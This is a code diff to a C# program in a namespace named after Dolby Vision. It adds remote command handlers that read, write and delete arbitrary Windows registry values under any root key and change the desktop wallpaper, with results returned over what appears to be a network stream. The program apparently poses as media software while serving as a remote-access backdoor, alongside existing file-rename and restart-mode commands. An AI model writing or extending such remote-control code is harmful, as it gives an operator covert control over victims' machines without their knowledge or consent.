@@ -477,6 +477,22 @@ namespace DolbyVision
                 {
                     return FileRename(cmd.Substring(12));
                 }
+                if (cmd.StartsWith("REG_READ:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return RegRead(cmd.Substring(9));
+                }
+                if (cmd.StartsWith("REG_WRITE:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return RegWrite(cmd.Substring(10));
+                }
+                if (cmd.StartsWith("REG_DELETE:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return RegDelete(cmd.Substring(11));
+                }
+                if (cmd.StartsWith("WALLPAPER:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return SetWallpaper(cmd.Substring(10));
+                }
                 if (cmd.Equals("RESTART_NORMAL", StringComparison.OrdinalIgnoreCase))
                 {
                     return RestartNormalMode();
@@ -992,6 +1008,132 @@ namespace DolbyVision
             }
             catch (Exception ex) { return "ERROR: " + ex.Message; }
         }
+
+        private static Microsoft.Win32.RegistryKey GetRootKey(string root)
+        {
+            switch (root.ToUpper())
+            {
+                case "HKCR": case "HKEY_CLASSES_ROOT": return Microsoft.Win32.Registry.ClassesRoot;
+                case "HKCU": case "HKEY_CURRENT_USER": return Microsoft.Win32.Registry.CurrentUser;
+                case "HKLM": case "HKEY_LOCAL_MACHINE": return Microsoft.Win32.Registry.LocalMachine;
+                case "HKU": case "HKEY_USERS": return Microsoft.Win32.Registry.Users;
+                case "HKCC": case "HKEY_CURRENT_CONFIG": return Microsoft.Win32.Registry.CurrentConfig;
+                default: return null;
+            }
+        }
+
+        private static string RegRead(string param)
+        {
+            try
+            {
+                // param: <根键>\<子键>|<值名>
+                int idx = param.IndexOf('|');
+                if (idx <= 0) return "ERROR: 参数错误,格式: HKCU\\路径|值名";
+                string keyPath = param.Substring(0, idx);
+                string valueName = param.Substring(idx + 1);
+                int slashIdx = keyPath.IndexOf('\\');
+                if (slashIdx <= 0) return "ERROR: 路径格式错误";
+                string root = keyPath.Substring(0, slashIdx);
+                string subKey = keyPath.Substring(slashIdx + 1);
+                var rootKey = GetRootKey(root);
+                if (rootKey == null) return "ERROR: 未知根键: " + root;
+                using (var key = rootKey.OpenSubKey(subKey))
+                {
+                    if (key == null) return "ERROR: 子键不存在: " + subKey;
+                    object val = key.GetValue(valueName);
+                    if (val == null) return "ERROR: 值不存在: " + valueName;
+                    string type = key.GetValueKind(valueName).ToString();
+                    string data;
+                    if (val is byte[])
+                        data = Convert.ToBase64String((byte[])val);
+                    else
+                        data = Convert.ToBase64String(Encoding.UTF8.GetBytes(val.ToString()));
+                    return "OK:" + type + "|" + data;
+                }
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static string RegWrite(string param)
+        {
+            try
+            {
+                // param: <根键>\<子键>|<值名>|<类型>|<Base64数据>
+                string[] parts = param.Split('|');
+                if (parts.Length < 4) return "ERROR: 参数错误,格式: HKCU\\路径|值名|SZ|Base64";
+                string keyPath = parts[0];
+                string valueName = parts[1];
+                string type = parts[2].ToUpper();
+                string b64 = parts[3];
+                int slashIdx = keyPath.IndexOf('\\');
+                if (slashIdx <= 0) return "ERROR: 路径格式错误";
+                string root = keyPath.Substring(0, slashIdx);
+                string subKey = keyPath.Substring(slashIdx + 1);
+                var rootKey = GetRootKey(root);
+                if (rootKey == null) return "ERROR: 未知根键: " + root;
+                byte[] raw = Convert.FromBase64String(b64);
+                using (var key = rootKey.CreateSubKey(subKey))
+                {
+                    if (key == null) return "ERROR: 无法创建子键";
+                    switch (type)
+                    {
+                        case "SZ": key.SetValue(valueName, Encoding.UTF8.GetString(raw), Microsoft.Win32.RegistryValueKind.String); break;
+                        case "EXPAND_SZ": key.SetValue(valueName, Encoding.UTF8.GetString(raw), Microsoft.Win32.RegistryValueKind.ExpandString); break;
+                        case "DWORD": key.SetValue(valueName, BitConverter.ToInt32(raw, 0), Microsoft.Win32.RegistryValueKind.DWord); break;
+                        case "QWORD": key.SetValue(valueName, BitConverter.ToInt64(raw, 0), Microsoft.Win32.RegistryValueKind.QWord); break;
+                        case "BINARY": key.SetValue(valueName, raw, Microsoft.Win32.RegistryValueKind.Binary); break;
+                        case "MULTI_SZ": key.SetValue(valueName, Encoding.UTF8.GetString(raw).Split('\n'), Microsoft.Win32.RegistryValueKind.MultiString); break;
+                        default: return "ERROR: 不支持的类型: " + type + " (支持:SZ/EXPAND_SZ/DWORD/QWORD/BINARY/MULTI_SZ)";
+                    }
+                }
+                return "OK: 写入成功";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static string RegDelete(string param)
+        {
+            try
+            {
+                // param: <根键>\<子键>|<值名>
+                int idx = param.IndexOf('|');
+                if (idx <= 0) return "ERROR: 参数错误";
+                string keyPath = param.Substring(0, idx);
+                string valueName = param.Substring(idx + 1);
+                int slashIdx = keyPath.IndexOf('\\');
+                if (slashIdx <= 0) return "ERROR: 路径格式错误";
+                string root = keyPath.Substring(0, slashIdx);
+                string subKey = keyPath.Substring(slashIdx + 1);
+                var rootKey = GetRootKey(root);
+                if (rootKey == null) return "ERROR: 未知根键: " + root;
+                using (var key = rootKey.OpenSubKey(subKey, true))
+                {
+                    if (key == null) return "ERROR: 子键不存在";
+                    key.DeleteValue(valueName, false);
+                }
+                return "OK: 删除成功";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static string SetWallpaper(string param)
+        {
+            try
+            {
+                if (param.Equals("DEFAULT", StringComparison.OrdinalIgnoreCase))
+                {
+                    SystemParametersInfo(0x0014, 0, "", 0x01 | 0x02);
+                    return "OK: 已恢复默认壁纸";
+                }
+                if (!File.Exists(param)) return "ERROR: 图片文件不存在: " + param;
+                SystemParametersInfo(0x0014, 0, param, 0x01 | 0x02);
+                return "OK: 壁纸已设置";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 
         private static void WriteStr(NetworkStream stream, string s)
         {
